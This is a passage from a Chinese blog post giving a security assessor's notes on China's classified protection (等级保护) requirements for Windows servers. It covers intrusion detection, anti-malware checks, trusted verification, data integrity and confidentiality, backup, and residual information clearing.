<h2 id="测评项目-d-3"><a href="#测评项目-d-3" class="headerlink" title="测评项目 d)"></a>测评项目 d)</h2><p><strong>内容</strong><br>应提供数据有效性检验功能，保证通过人机接口输入或通过通信接口输入的内容符合系统设定要求</p>
<p>这一项略</p>
<h2 id="测评项目-e-1"><a href="#测评项目-e-1" class="headerlink" title="测评项目 e)"></a>测评项目 e)</h2><p><strong>内容</strong><br>应能发现可能存在的已知漏洞，并在经过充分测试评估后，及时修补漏洞</p>
<h3 id="应通过漏洞扫描、渗透测试等方式核查是否不存在高风险漏洞；是否在经过充分测试评估后及时修补漏洞"><a href="#应通过漏洞扫描、渗透测试等方式核查是否不存在高风险漏洞；是否在经过充分测试评估后及时修补漏洞" class="headerlink" title="应通过漏洞扫描、渗透测试等方式核查是否不存在高风险漏洞；是否在经过充分测试评估后及时修补漏洞"></a>应通过漏洞扫描、渗透测试等方式核查是否不存在高风险漏洞；是否在经过充分测试评估后及时修补漏洞</h3><p>DDDD</p>
<h2 id="测评项目-f-1"><a href="#测评项目-f-1" class="headerlink" title="测评项目 f)"></a>测评项目 f)</h2><p><strong>内容</strong><br>应能够检测到对重要节点进行入侵的行为，并在发生严重入侵事件时提供报警</p>
<p>这一项对于windows来说，要通过第三方软硬件来实现了。</p>
<p>比如EDR、卡巴斯基（企业版）等，等具备入侵防范检测和报警功能（通过邮箱、短信等），或者在网络中部署有IPS等设备具有相关功能也可以。</p>
<p>另外，部署在云上的话，阿里云、华为云等，也存在这样的安全服务，也可以实现要求。但是要注意的是，被测评方是否购买了此类安全服务。</p>
<h1 id="恶意代码防范"><a href="#恶意代码防范" class="headerlink" title="恶意代码防范"></a>恶意代码防范</h1><h2 id="测评项目a"><a href="#测评项目a" class="headerlink" title="测评项目a)"></a>测评项目a)</h2><p><strong>内容</strong><br>应采用免受恶意代码攻击的技术措施或主动免疫可信验证机制及时识别入侵和病毒行为，并将其有效阻断。</p>
<h3 id="应采用免受恶意代码攻击的技术措施或主动免疫可信验证机制及时识别入侵和病毒行为，并将其有效阻断。"><a href="#应采用免受恶意代码攻击的技术措施或主动免疫可信验证机制及时识别入侵和病毒行为，并将其有效阻断。" class="headerlink" title="应采用免受恶意代码攻击的技术措施或主动免疫可信验证机制及时识别入侵和病毒行为，并将其有效阻断。"></a>应采用免受恶意代码攻击的技术措施或主动免疫可信验证机制及时识别入侵和病毒行为，并将其有效阻断。</h3><p>1）查看是否安装了防恶意代码软件（注：凡Windows操作系统，未安装防恶意代码软件统统判定为高风险，情况较为严重）<br>2）查看恶意代码软件的病毒库及版本是否及时进行了更新</p>
<h1 id="可信验证"><a href="#可信验证" class="headerlink" title="可信验证"></a>可信验证</h1><h2 id="测评项目a-1"><a href="#测评项目a-1" class="headerlink" title="测评项目a)"></a>测评项目a)</h2><p><strong>内容</strong><br>可基于可信根对计算设备的系统引导程序、系统程序、重要配置参数和应用程序等进行可信验证，并在应用程序的关键执行环节进行动态可信验证，在检测到其可信性受到破坏后进行报警，并将验证结果形成审计记录送至安全管理中心。</p>
<h3 id="可基于可信根对计算设备的的关键执行环节进行动态可信验证、行报警，并将验证结果形成审计记录送至安全管理中心。"><a href="#可基于可信根对计算设备的的关键执行环节进行动态可信验证、行报警，并将验证结果形成审计记录送至安全管理中心。" class="headerlink" title="可基于可信根对计算设备的的关键执行环节进行动态可信验证、行报警，并将验证结果形成审计记录送至安全管理中心。"></a>可基于可信根对计算设备的的关键执行环节进行动态可信验证、行报警，并将验证结果形成审计记录送至安全管理中心。</h3><p>目前绝大部分的信息系统都没有可信验证，仅在工控系统中存在极少数含有可信计算的，所以目前此项都是不适用，（如果运气好遇到可信计算的信息系统另算）</p>
<h1 id="数据完整性"><a href="#数据完整性" class="headerlink" title="数据完整性"></a>数据完整性</h1><h2 id="测评项目a-2"><a href="#测评项目a-2" class="headerlink" title="测评项目a)"></a>测评项目a)</h2><p><strong>内容</strong><br>应采用校验技术或密码技术保证重要数据在传输过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等。</p>
<h3 id="应采用校验技术或密码技术保证重要数据在传输过程中的完整性"><a href="#应采用校验技术或密码技术保证重要数据在传输过程中的完整性" class="headerlink" title="应采用校验技术或密码技术保证重要数据在传输过程中的完整性"></a>应采用校验技术或密码技术保证重要数据在传输过程中的完整性</h3><p>若服务器的数据仅含自身配置数据，那么就根据身份鉴别C项来写，涉及到别的例如审计数据的传输再另外算</p>
<h2 id="测评项目b"><a href="#测评项目b" class="headerlink" title="测评项目b)"></a>测评项目b)</h2><p><strong>内容</strong><br>应采用校验技术或密码技术保证重要数据在存储过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等。</p>
<h3 id="应采用校验技术或密码技术保证重要数据在存储过程中的完整性"><a href="#应采用校验技术或密码技术保证重要数据在存储过程中的完整性" class="headerlink" title="应采用校验技术或密码技术保证重要数据在存储过程中的完整性"></a>应采用校验技术或密码技术保证重要数据在存储过程中的完整性</h3><p>操作系统能够保证自身数据存储的完整性</p>
<h1 id="数据保密性"><a href="#数据保密性" class="headerlink" title="数据保密性"></a>数据保密性</h1><h2 id="测评项目a-3"><a href="#测评项目a-3" class="headerlink" title="测评项目a)"></a>测评项目a)</h2><p><strong>内容</strong><br>应采用密码技术保证重要数据在传输过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等。 </p>
<h3 id="应采用密码技术保证重要数据在传输过程中的保密性，"><a href="#应采用密码技术保证重要数据在传输过程中的保密性，" class="headerlink" title="应采用密码技术保证重要数据在传输过程中的保密性，"></a>应采用密码技术保证重要数据在传输过程中的保密性，</h3><p>若服务器的数据仅含自身配置数据，那么就根据身份鉴别C项来写，涉及到别的例如审计数据的传输再另外算</p>
<h2 id="测评项目b-1"><a href="#测评项目b-1" class="headerlink" title="测评项目b)"></a>测评项目b)</h2><p><strong>内容</strong><br>应采用密码技术保证重要数据在存储过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等。 </p>
<h3 id="应采用密码技术保证重要数据在存储过程中的保密性"><a href="#应采用密码技术保证重要数据在存储过程中的保密性" class="headerlink" title="应采用密码技术保证重要数据在存储过程中的保密性"></a>应采用密码技术保证重要数据在存储过程中的保密性</h3><p>操作系统能够保证自身数据在存储过程的保密性</p>
<h1 id="数据备份恢复"><a href="#数据备份恢复" class="headerlink" title="数据备份恢复"></a>数据备份恢复</h1><h2 id="测评项目a-4"><a href="#测评项目a-4" class="headerlink" title="测评项目a)"></a>测评项目a)</h2><p><strong>内容</strong><br>应提供重要数据的本地数据备份与恢复功能。</p>
<h3 id="应提供重要数据的本地数据备份与恢复功能；"><a href="#应提供重要数据的本地数据备份与恢复功能；" class="headerlink" title="应提供重要数据的本地数据备份与恢复功能；"></a>应提供重要数据的本地数据备份与恢复功能；</h3><p>服务器仅存在自身配置数据的情况下是不需要备份和恢复，所以此项在服务器层面是不适用，应在数据库层面体现。</p>
<h2 id="测评项目b-2"><a href="#测评项目b-2" class="headerlink" title="测评项目b)"></a>测评项目b)</h2><p><strong>内容</strong><br>应提供异地实时备份功能，利用通信网络将重要数据实时备份至备份场地</p>
<h3 id="应提供异地实时备份功能，利用通信网络将重要数据实时备份至备份场地。"><a href="#应提供异地实时备份功能，利用通信网络将重要数据实时备份至备份场地。" class="headerlink" title="应提供异地实时备份功能，利用通信网络将重要数据实时备份至备份场地。"></a>应提供异地实时备份功能，利用通信网络将重要数据实时备份至备份场地。</h3><p>服务器仅存在自身配置数据的情况下是不需要异地备份和恢复，所以此项在服务器层面是不适用，应在数据库层面体现。</p>
<h2 id="测评项目c"><a href="#测评项目c" class="headerlink" title="测评项目c)"></a>测评项目c)</h2><p><strong>内容</strong><br>应提供重要数据处理系统的热冗余，保证系统的高可用性。</p>
<h3 id="应提供重要数据处理系统的热冗余，保证系统的高可用性。"><a href="#应提供重要数据处理系统的热冗余，保证系统的高可用性。" class="headerlink" title="应提供重要数据处理系统的热冗余，保证系统的高可用性。"></a>应提供重要数据处理系统的热冗余，保证系统的高可用性。</h3><p>此项需要询问管理员和查询网络拓扑图，服务器是否采用热冗余的方式部署，能不能够保证服务器的高可用性</p>
<h1 id="剩余信息保护"><a href="#剩余信息保护" class="headerlink" title="剩余信息保护"></a>剩余信息保护</h1><h2 id="测评项目a-5"><a href="#测评项目a-5" class="headerlink" title="测评项目a)"></a>测评项目a)</h2><p><strong>内容</strong><br>应保证鉴别信息所在的存储空间被释放或重新分配前得到完全清除；</p>
<h3 id="应保证鉴别信息所在的存储空间被释放或重新分配前得到完全清除"><a href="#应保证鉴别信息所在的存储空间被释放或重新分配前得到完全清除" class="headerlink" title="应保证鉴别信息所在的存储空间被释放或重新分配前得到完全清除"></a>应保证鉴别信息所在的存储空间被释放或重新分配前得到完全清除</h3><p>查看是否禁用“用可换源的加密来存储密码”和启用“清除虚拟内存页面文件”，</p>
<h2 id="测评项目b-3"><a href="#测评项目b-3" class="headerlink" title="测评项目b)"></a>测评项目b)</h2><p><strong>内容</strong><br>应保证存有敏感数据的存储空间被释放或重新分配前得到完全清除。 </p>
<h3 id="应保证存有敏感数据的存储空间被释放或重新分配前得到完全清除。"><a href="#应保证存有敏感数据的存储空间被释放或重新分配前得到完全清除。" class="headerlink" title="应保证存有敏感数据的存储空间被释放或重新分配前得到完全清除。"></a>应保证存有敏感数据的存储空间被释放或重新分配前得到完全清除。</h3><p>查看是否禁用了“清除虚拟内存页面文件”，能不能够保证存有敏感数据的存储空间被释放或重新分配前得到完全清除</p>
]]></content>
      <categories>
        <category>等级保护</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
</search>
